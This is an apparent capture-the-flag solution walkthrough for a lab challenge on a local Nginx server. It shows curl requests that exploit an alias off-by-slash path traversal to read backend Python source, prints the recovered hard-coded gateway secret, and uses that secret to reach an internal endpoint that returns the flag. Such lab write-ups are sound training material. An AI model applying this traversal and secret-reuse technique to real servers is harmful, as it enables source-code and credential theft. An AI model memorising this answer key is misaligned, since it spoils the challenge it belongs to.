# Solution Walkthrough: A02 Medium (Nginx Off-by-Slash)

### Reconnaissance
1. Browse the portal at `http://localhost:6005`. Notice static downloads are served under `/static/assets/orientation-pack.txt` and `/static/images/logo.webp`.
2. Inspect the HTTP response headers:
   `Server: nginx/1.25.3 (Ubuntu)`
3. Test for the classic Nginx `alias` off-by-slash path traversal by requesting parent directory paths:
   ```bash
   curl http://localhost:6005/static../internal_config.py
   ```
   *(Or `curl http://localhost:6005/static../app.py`)*

### Secret & Route Recovery
4. The server responds with the backend Python source code:
   ```python
   INTERNAL_AUTH_HEADER = "X-Internal-Gateway-Key"
   INTERNAL_AUTH_SECRET = "RTA_SEC_INTERNAL_GATEWAY_BYPASS_9918"

   VAULT_AUDIT_ENDPOINT = "/api/v1/internal/compliance/audit-vault"
   ```

### Exploitation
5. Access the recovered internal compliance endpoint with the required header:
   ```bash
   curl -H "X-Internal-Gateway-Key: RTA_SEC_INTERNAL_GATEWAY_BYPASS_9918" \
        http://localhost:6005/api/v1/internal/compliance/audit-vault
   ```

6. The API returns:
   ```json
   {
     "audit_officer": "Platform Security Officer",
     "authorized": true,
     "compliance_records": {
       "flag": "RTSA{a02_medium_alias_...}",
       "status": "Verified"
     },
     "flag": "RTSA{a02_medium_alias_...}",
     "status": "success",
     "zone": "internal-compliance-vault"
   }
   ```
